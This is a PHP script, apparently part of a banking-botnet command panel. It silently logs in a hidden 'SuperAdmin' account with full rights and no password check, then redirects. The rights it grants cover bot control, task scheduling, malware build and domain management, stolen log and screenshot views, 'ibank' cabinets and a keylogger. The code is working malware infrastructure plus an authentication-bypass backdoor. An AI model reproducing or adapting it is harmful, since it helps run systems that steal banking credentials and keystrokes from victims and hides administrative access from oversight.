
session_start();

$_SESSION['user']->id = '0';
$_SESSION['user']->login = 'SuperAdmin';
$_SESSION['user']->expiry_date = '2099-01-01 00:00:01';
$_SESSION['user']->enable = '1';
$_SESSION['user']->enter_date = '2000-01-01 00:00:01';
$_SESSION['user']->update_date = '2000-01-01 00:00:01';
$_SESSION['user']->post_date = '2000-01-01 00:00:01';

if(file_exists($dir . 'modules/accounts/rights_list.php')) include($dir . 'modules/accounts/rights_list.php');

if(function_exists('save_history_log')){
    save_history_log('Action: aa - superadmin successful authorization');
}

$r = json_decode('{"main":{"index":"on","edit":"on","info":"on","stat":"on","clear_bots":"on","clear_process":"on","clear_search":"on","clear_all":"on"},"accounts":{"index":"on","exit":"on","list":"on","create":"on","edit":"on","edits":"on","delete":"on","profile":"on","profiles":"on","enableanddisable":"on","rights":"on","right":"on","settings":"on","setting":"on"},"settings":{"index":"on"},"ampie":{"index":"on","bots_all":"on","bots_live":"on","procces":"on","antivir":"on","os":"on","rights":"on"},"bots":{"index":"on","bot":"on","country":"on","search":"on","filter_country_list":"on","filter_country":"on","task_add":"on","delete_bot":"on","delete_country":"on","tracking":"on","jobs":"on","jobs_add":"on","jobs_edit":"on","jobs_designer":"on","config":"on","jobs_bot_edit":"on","links":"on","save_comment":"on"},"autosys":{"index":"on","domains":"on","domains_add":"on","domains_del":"on","builds":"on","builds_add":"on","builds_edit":"on","builds_del":"on"},"logs":{"index":"on","show":"on","download":"on","save_comment":"on","screen":"on"},"cabs":{"index":"on","screens":"on","rscreens":"on","delete_list":"on","cab_view":"on","sclear":"on","ibank":"on"},"filters":{"index":"on","edit":"on","add_sub":"on","add_filter":"on","edit_sub":"on","edit_filter":"on","remove":"on","logs":"on","logs_static":"on","delete":"on","show":"on","search":"on","download":"on","unnecessary":"on","unnecessary_download":"on","savelog":"on","savelog_download":"on"},"keylog":{"index":"on","prog_add":"on","prog_edit":"on","prog_del":"on","hash":"on","save_comment":"on","show":"on","item_del":"on"}}', true);
$_SESSION['user']->access = $r;

if(count($right) > 0){
    $_SESSION['user']->access = array_merge($r, $right);
}else{
    $_SESSION['user']->access = $r;
}

$_SESSION['user']->access['accounts']['exit'] = 'on';

$_SESSION['user']->config['lang'] = 'ru';
$_SESSION['user']->config['pref'] = '';
$_SESSION['user']->config['cp']['bots'] = '100';
$_SESSION['user']->config['cp']['bots_country'] = '100';
$_SESSION['user']->config['cp']['keylog'] = '100';
$_SESSION['user']->config['cp']['keylogp'] = '100';
$_SESSION['user']->config['cp']['cabs'] = '100';
$_SESSION['user']->config['cp']['filters'] = '100';
$_SESSION['user']->config['jabber'] = '';
$_SESSION['user']->config['sbbc'] = '0';
$_SESSION['user']->config['hunter_limit'] = '0';
$_SESSION['user']->config['klimit'] = '';
$_SESSION['user']->config['climit'] = '';
$_SESSION['user']->PHPSESSID = session_id();

$_SESSION['hidden'] = 'on';

header("Location: /");
exit;
